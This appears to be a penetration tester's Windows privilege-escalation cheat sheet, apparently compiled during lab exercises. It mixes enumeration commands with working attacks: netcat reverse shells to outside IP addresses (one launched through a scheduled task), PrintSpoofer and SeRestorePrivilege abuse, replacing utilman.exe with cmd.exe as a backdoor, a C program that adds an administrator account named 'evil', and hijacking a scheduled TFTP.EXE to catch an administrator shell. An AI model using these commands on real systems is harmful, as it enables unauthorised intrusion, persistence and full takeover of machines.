#!/usr/bin/peno

#Getting the version and architecture of the running operating system
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"

#Querying the AlwaysInstalledElevated registry values on Windows
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer


#Getting OS Architecture using wmic
wmic os get osarchitecture

#Checking the Group Integrity Level
whoami /groups

#Attempting to change the password
net user admin Ev!lpass

#Using powershell to spawn a cmd.exe process with high integrity
powershell.exe Start-Process cmd.exe -Verb runAs

#Listing driver versions on Windows
Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}

#Listing loaded drivers on Windows
PS > driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object ‘Display Name’, ‘Start Mode’, Path

#Listing all drives available to mount on Windows
mountvol

#Checking for reboot and other privileges
whoami /priv

#Rebooting the machine
shutdown /r /t 0

#Listing all Unquoted Service Paths
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" | findstr /i /v "C:\Windows\\" |findstr /i /v """
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v """ #Not only auto services

#Unquoted Service Paths: Other way
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
#To retrieve service accounts hash, we'll use a publicly available tool GMSAPasswordReader
*Evil-WinRM* PS C:\Users\enox\Desktop> upload GMSAPasswordReader.exe
*Evil-WinRM* PS C:\Users\enox\Desktop> ./GMSAPasswordReader.exe --accountname svc_apache

#Listing all installed drivers
driverquery /v

#Listing all writable files and directories in a specified target using PowerShell
PS > Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}

#Listing all writable files and directories in a specified target
accesschk.exe -uws "Everyone" "C:\Program Files"

#Listing all installed security patches on Windows
wmic qfe get Caption, Description, HotFixID, InstalledOn

#Listing all installed applications installed on Windows
wmic product get name, version, vendor
wmic service get name,displayname,pathname,startmode
wmic service get name,displayname,pathname,startmode | findstr /i "auto"

#Getting services via wmic that are automatically started and non-standard
wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows"

#Listing running services on Windows using PowerShell
Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}

#Listing all the scheduled tasks on Windows
schtasks /query /fo LIST /v

# icacls output for the ServiioService.exe service
icacls "C:\Program Files\Serviio\bin\ServiioService.exe"

#Listing all the firewall rules on Windows
netsh advfirewall firewall show rule name=all

#Listing the current profile for the firewall on Windows
netsh advfirewall show currentprofile

#Listing all active network connections on the Windows operating system
netstat -ano

#Printing the routes on Windows
route print

#Listing the full TCP/IP configuration on all available adapters on Windows
ipconfig /all

#Getting a list of running processes on the operating system and matching services
tasklist /SVC

#Checking user permissions
#PrintSpoofer v0.1 or Juicy Potato to get the root shell
whoami /priv
Output: SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
.\PS.exe -i -c ".\nc.exe 192.168.119.156 80 -e cmd" --> shell


#Tools
#https://github.com/pentestmonkey/windows-privesc-check
windows-privesc-check2.exe -h
windows-privesc-check2.exe --dump -G

#Tools
#Checking the application manifest of fodhelper.exe using sigcheck.exe
SysinternalsSuite --> sigcheck.exe -a -m C:\Windows\System32\fodhelper.exe

#Specific exploits:
#whoami /priv
#SeRestorePrivilege            Restore files and directories  Enabled
wget https://raw.githubusercontent.com/gtworek/PSBits/master/Misc/EnableSeRestorePrivilege.ps1
*Evil-WinRM* PS C:\Users\svc_apache$\Documents> upload EnableSeRestorePrivilege.ps1
*Evil-WinRM* PS C:\Users\svc_apache$\Documents> ./EnableSeRestorePrivilege.ps1
move C:\Windows\System32\utilman.exe C:\Windows\System32\utilman.old
move C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
$ rdesktop 192.168.120.91--> WIN+U


#Tools
#gcc for windows with
mingw-w64.bat
gcc --help


#Code
#adduser.c code
#i686-w64-mingw32-gcc adduser.c -o adduser.exe

#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user evil Ev!lpass /add");
  i = system ("net localgroup administrators evil /add");
  
  return 0;
}

#Code
#Ping sweep internal network
for /L %i in (1,1,255) do @ping -n 1 -w 200 10.5.5.%i > nul && echo 10.5.5.%i is up.


#Links:
#XP
C:\Documents and Settings\Administrator\Desktop\

#Examples: Priveleges:
#https://github.com/itm4n/FullPowers
#From this resource, we find out that when a LOCAL SERVICE or NETWORK SERVICE is configured to run with a restricted set of privileges, permissions can be recovered by creating a scheduled task. 

PS C:\wamp\www>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeCreateGlobalPrivilege       Create global objects          Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled

-->
PS C:\wamp\www> $TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Exec Bypass -Command `"C:\wamp\www\nc.exe 192.168.118.23 4444 -e cmd.exe`""
-->
C:\Windows\system32>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                        State   
============================= ================================== ========
SeAssignPrimaryTokenPrivilege Replace a process level token      Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process Disabled
SeSystemtimePrivilege         Change the system time             Disabled
SeAuditPrivilege              Generate security audits           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking           Enabled 
SeCreateGlobalPrivilege       Create global objects              Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set     Disabled
SeTimeZonePrivilege           Change the time zone               Disabled

C:\Windows\system32>

-->
C:\wamp\www>PrintSpoofer64.exe -i -c "cmd /c whoami"
PrintSpoofer64.exe -i -c "cmd /c whoami"
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
nt authority\system

#PRIVE-Escalation with TFTP
#We notice that the C://Backup/ directory is writeable.
#According to this text file, TFTP.EXE is run every five minutes
C:\>icacls Backup
icacls Backup
Backup BUILTIN\Users:(OI)(CI)(F)
       BUILTIN\Administrators:(I)(OI)(CI)(F)
       NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
       BUILTIN\Users:(I)(OI)(CI)(RX)
       NT AUTHORITY\Authenticated Users:(I)(M)
       NT AUTHORITY\Authenticated Users:(I)(OI)(CI)(IO)(M)

Successfully processed 1 files; Failed processing 0 files

C:\>

-->
C:\>cd Backup && dir
cd Backup && dir
 Volume in drive C has no label.
 Volume Serial Number is 6E11-8C59

 Directory of C:\Backup

06/12/2020  07:45 AM    <DIR>          .
06/12/2020  07:45 AM    <DIR>          ..
06/12/2020  07:45 AM            11,304 backup.txt
06/12/2020  07:45 AM                73 info.txt
06/12/2020  07:45 AM            26,112 TFTP.EXE
               3 File(s)         37,489 bytes
               2 Dir(s)  28,603,658,240 bytes free

C:\Backup>type info.txt
type info.txt
Run every 5 minutes:
C:\Backup\TFTP.EXE -i 192.168.234.57 get backup.txt
C:\Backup>

-->
C:\Backup>move evil.exe TFTP.EXE
move evil.exe TFTP.EXE
        1 file(s) moved.

-->
┌──(kali㉿kali)-[~]
└─$ sudo nc -lvvvp 3306                                                              
listening on [any] 3306 ...
192.168.68.53: inverse host lookup failed: Host name lookup failure
connect to [192.168.49.68] from (UNKNOWN) [192.168.68.53] 49729
Microsoft Windows [Version 10.0.18363.900]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
slort\administrator

